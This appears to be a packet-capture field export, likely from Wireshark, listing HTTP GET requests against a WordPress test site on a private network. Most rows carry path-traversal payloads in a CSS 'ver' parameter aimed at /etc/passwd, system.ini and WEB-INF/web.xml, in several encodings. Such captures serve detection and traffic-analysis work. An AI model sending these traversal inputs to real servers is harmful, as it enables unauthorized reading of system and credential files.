http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2712					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-content/themes/twentytwentyone/style.css?ver=%5C..%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-content/themes/twentytwentyone/style.css?ver=%5C..%5CWEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2720					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F
											no-cache								0	0							192.168.1.102									2723					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C
											no-cache								0	0							192.168.1.102									2732					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=WEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=WEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2735					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=WEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=WEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2739					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%2FWEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2742					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%5CWEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2745					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=..%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=..%2FWEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2748					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=..%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=..%5CWEB-INF%5Cweb.xml
											no-cache																192.168.1.102									2751					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/dist/block-library
											no-cache								0	0							192.168.1.102									2754					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%2F..%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%2F..%2FWEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2755					http://192.168.1.102/web/wp-login.php?reauth=1&redirect_to=http%3A%2F%2F192.168.1.102%2Fweb%2Fwp-admin%2F	1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=%5C..%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=%5C..%5CWEB-INF%5Cweb.xml
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2759					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=c%3A%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=c%3A%2FWindows%2Fsystem.ini
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2762					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini
											no-cache								0	0							192.168.1.102									2767					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%2FWindows%2Fsystem.ini
											no-cache																192.168.1.102									2771					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/images		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/images
											no-cache								0	0							192.168.1.102									2724					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2773					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=c%3A%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=c%3A%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2776					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2780					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2782					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini
											no-cache								0	0							192.168.1.102									2785					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2788					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=Windows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=Windows%2Fsystem.ini
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2774					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2791					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=Windows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=Windows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2798					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2Fetc%2Fpasswd
											no-cache								0	0							192.168.1.102									2800					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2790					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini
											no-cache								0	0							192.168.1.102									2802					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
											no-cache								0	0							192.168.1.102									2806					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=etc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=etc%2Fpasswd
											no-cache								0	0							192.168.1.102									2813					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%2F
											no-cache								0	0							192.168.1.102									2816					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F
											no-cache								0	0							192.168.1.102									2819					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%5C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=c%3A%5C
											no-cache								0	0							192.168.1.102									2822					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2803					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini
											no-cache								0	0							192.168.1.102									2825					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C
											no-cache								0	0							192.168.1.102									2829					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F
											no-cache								0	0							192.168.1.102									2831					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C
											no-cache								0	0							192.168.1.102									2839					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=WEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=WEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2842					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=WEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=WEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2844					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2FWEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2846					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%5CWEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2849					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%2FWEB-INF%2Fweb.xml
											no-cache								0	0							192.168.1.102									2852					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5CWEB-INF%5Cweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=..%5CWEB-INF%5Cweb.xml
											no-cache								0	0							192.168.1.102									2855					http://192.168.1.102/web/index.php/2022/01/21/hola-mundo/embed/	1	http://192.168.1.102/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2FWEB-INF%2Fweb.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0				/web/wp-includes/css/wp-embed-template-ie.min.css?ver=%2F..%2FWEB-INF%2Fweb.xml
text/css,*/*;q=0.1		en-US,en;q=0.5															keep-alive		0	0							192.168.1.102									2826					http://192.168.1.102/web/	1	http://192.168.1.102/web/wp-includes/css/dist/block-library/style.min.css?ver=Windows%2Fsystem.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0				/web/wp-includes/css/dist/block-library/style.min.css?ver=Windows%2Fsystem.ini
